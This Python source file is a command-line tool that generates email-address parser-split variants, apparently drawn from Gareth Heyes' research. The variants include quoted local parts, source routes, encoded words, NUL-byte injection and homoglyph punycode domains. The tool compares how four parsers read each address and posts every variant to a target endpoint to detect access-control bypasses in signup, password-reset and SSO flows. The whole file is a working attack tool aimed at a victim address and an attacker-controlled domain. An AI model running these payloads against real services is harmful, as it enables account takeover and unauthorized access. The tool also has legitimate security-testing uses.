"""email-atom — split-the-email-atom variant generator and parser-disagreement tester.

Inspired by Gareth Heyes' research on email parser splits used to bypass
access control gates (signup, password-reset, SSO trust on email domain).
"""

import argparse
import json
import os
import re
import sys
import urllib.error
import urllib.parse
import urllib.request
from email.headerregistry import Address as HRAddress
from email.utils import parseaddr


def _ansi(code: str) -> str:
    if os.environ.get("NO_COLOR") or not sys.stdout.isatty():
        return ""
    return code


RED = _ansi("\033[31m")
YEL = _ansi("\033[33m")
DIM = _ansi("\033[2m")
RST = _ansi("\033[0m")


def build_variants(local: str, target: str, attacker: str) -> list[tuple[str, str]]:
    """Return list of (variant_label, raw_address)."""
    base = f"{local}@{target}"
    variants: list[tuple[str, str]] = [
        ("baseline", base),
        ("quoted-localpart", f'"{local}@{target}"@{attacker}'),
        ("quoted-with-comma", f'"{local}@{target},x"@{attacker}'),
        ("rfc5321-source-route", f"@{attacker}:{local}@{target}"),
        ("comment-after-local", f"{local}(@{attacker}){target.split('.')[0]}@{target}"),
        ("comment-before-domain", f"{local}@({attacker}){target}"),
        ("encoded-word-local", f"=?utf-8?q?{local}?=@{attacker}"),
        ("multiple-at-rfc5322", f"{local}@{target}@{attacker}"),
        ("punycode-domain", _punycode_lookalike(local, target, attacker)),
        ("cfws-folded", f"{local}@{target}\r\n @{attacker}"),
        ("dotless-trailing", f"{local}@{target}.@{attacker}"),
        ("ipv6-literal", f"{local}@[IPv6:::1]@{attacker}"),
        ("group-syntax", f"undisclosed-recipients:{local}@{target},x@{attacker};"),
        ("nul-byte-inject", f"{local}@{target}\x00@{attacker}"),
        ("backslash-escape", f"{local}\\@{target}@{attacker}"),
    ]
    return variants


def _punycode_lookalike(local: str, target: str, attacker: str) -> str:
    # Replace one ASCII letter in target with a homoglyph, then punycode.
    # Targets the "trusted-domain by string-compare" check which sees the
    # decoded form but DNS / TLS resolves the punycode form.
    homoglyphs = {"a": "а", "e": "е", "o": "о", "p": "р", "c": "с"}
    for ch, glyph in homoglyphs.items():
        if ch in target:
            spoofed = target.replace(ch, glyph, 1)
            try:
                return f"{local}@{spoofed.encode('idna').decode()}"
            except UnicodeError:
                continue
    return f"{local}@xn--{target}.{attacker}"


PARSERS = ["stdlib.parseaddr", "headerregistry.Address", "naive.regex", "rfc5321.rcpt"]


def parse_each(raw: str) -> dict[str, str]:
    """Run the same address through 4 parsers, return what each calls 'the domain'."""
    out: dict[str, str] = {}

    _, addr = parseaddr(raw)
    out["stdlib.parseaddr"] = addr.split("@", 1)[-1] if "@" in addr else "<nodomain>"

    try:
        a = HRAddress(addr_spec=raw)
        out["headerregistry.Address"] = a.domain or "<nodomain>"
    except Exception as exc:
        out["headerregistry.Address"] = f"<error: {type(exc).__name__}>"

    m = re.search(r"@([A-Za-z0-9.\-]+)\s*$", raw)
    out["naive.regex"] = m.group(1) if m else "<nomatch>"

    # RFC 5321 RCPT TO: an SMTP server reads the *last* @ before the closing >.
    # When wrapped in quotes/comments the SMTP layer often strips them and
    # routes to the bare domain — emulated here by stripping quoted blocks.
    stripped = re.sub(r'"[^"]*"', "", raw)
    last_at = stripped.rfind("@")
    out["rfc5321.rcpt"] = stripped[last_at + 1 :] if last_at >= 0 else "<nodomain>"

    return out


def find_disagreement(parsed: dict[str, str], target: str, attacker: str) -> str | None:
    domains = list(parsed.values())
    routes_attacker = any(attacker in d for d in domains)
    looks_trusted = any(d == target or d.endswith("." + target) for d in domains)
    if routes_attacker and looks_trusted:
        return "split: one parser sees trusted, another sees attacker"
    distinct = {d for d in domains if not d.startswith("<")}
    if len(distinct) >= 2:
        return f"diverge: {len(distinct)} distinct domains"
    return None


def cmd_gen(args: argparse.Namespace) -> int:
    if "@" not in args.email:
        print("error: email must be local@domain (use --email)", file=sys.stderr)
        return 1
    local, target = args.email.split("@", 1)
    variants = build_variants(local, target, args.attacker)

    rows = []
    for label, raw in variants:
        parsed = parse_each(raw)
        flag = find_disagreement(parsed, target, args.attacker)
        rows.append({"label": label, "raw": raw, "parsed": parsed, "flag": flag})

    if args.json:
        json.dump(rows, sys.stdout, indent=2, default=str)
        sys.stdout.write("\n")
        return 0

    _print_table(rows)
    return 0


def _print_table(rows: list[dict]) -> None:
    label_w = max(len(r["label"]) for r in rows) + 1
    print(f"{'variant':<{label_w}} {'parser':<24} domain")
    print("-" * (label_w + 26 + 30))
    for r in rows:
        for parser in PARSERS:
            domain = r["parsed"][parser]
            color = ""
            if r["flag"] and r["flag"].startswith("split"):
                color = RED
            elif r["flag"]:
                color = YEL
            print(f"{r['label']:<{label_w}} {parser:<24} {color}{domain}{RST}")
        if r["flag"]:
            print(f"{DIM}  ↳ {r['flag']}{RST}")


def cmd_probe(args: argparse.Namespace) -> int:
    if "@" not in args.email:
        print("error: email must be local@domain (use --email)", file=sys.stderr)
        return 1
    local, target = args.email.split("@", 1)
    variants = build_variants(local, target, args.attacker)

    print(f"probe target: {args.url}")
    print(f"field: {args.field}")
    print(f"variants: {len(variants)}")
    print()

    baseline_resp = _send(args.url, args.field, f"{local}@{target}", args.method, args.timeout)
    if baseline_resp is None:
        print("error: baseline request failed — target unreachable", file=sys.stderr)
        return 2
    print(f"baseline status={baseline_resp[0]} length={baseline_resp[1]}")
    print()

    for label, raw in variants:
        if label == "baseline":
            continue
        resp = _send(args.url, args.field, raw, args.method, args.timeout)
        if resp is None:
            print(f"  {label:<24} request failed")
            continue
        status, length = resp
        delta_status = "=" if status == baseline_resp[0] else "≠"
        delta_len = length - baseline_resp[1]
        marker = ""
        if delta_status == "≠" or abs(delta_len) > 32:
            marker = f"  {YEL}<- response shape changed{RST}"
        print(
            f"  {label:<24} status={status} {delta_status}base  len={length} ({delta_len:+d}){marker}"
        )
    return 0


def _send(
    url: str, field: str, value: str, method: str, timeout: float
) -> tuple[int, int] | None:
    data = urllib.parse.urlencode({field: value}).encode()
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("User-Agent", "email-atom/0.1")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read()
            return resp.status, len(body)
    except urllib.error.HTTPError as exc:
        try:
            body = exc.read()
        except Exception:
            body = b""
        return exc.code, len(body)
    except (urllib.error.URLError, TimeoutError, OSError):
        return None


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        prog="email-atom",
        description="Generate and diff email parser-split variants for access-control bypass testing.",
    )
    sub = parser.add_subparsers(dest="cmd", required=True)

    g = sub.add_parser("gen", help="Print variants and how 4 parsers see each one.")
    g.add_argument("--email", required=True, help="base email like victim@target.com")
    g.add_argument("--attacker", required=True, help="attacker-controlled domain")
    g.add_argument("--json", action="store_true", help="emit JSON instead of table")
    g.set_defaults(func=cmd_gen)

    p = sub.add_parser("probe", help="POST each variant to URL field and diff responses.")
    p.add_argument("--email", required=True, help="base email like victim@target.com")
    p.add_argument("--attacker", required=True, help="attacker-controlled domain")
    p.add_argument("--url", required=True, help="target endpoint")
    p.add_argument("--field", default="email", help="form field name (default: email)")
    p.add_argument("--method", default="POST", help="HTTP method (default: POST)")
    p.add_argument("--timeout", type=float, default=10.0, help="seconds (default: 10)")
    p.set_defaults(func=cmd_probe)

    args = parser.parse_args(argv)
    return args.func(args)


if __name__ == "__main__":
    sys.exit(main())
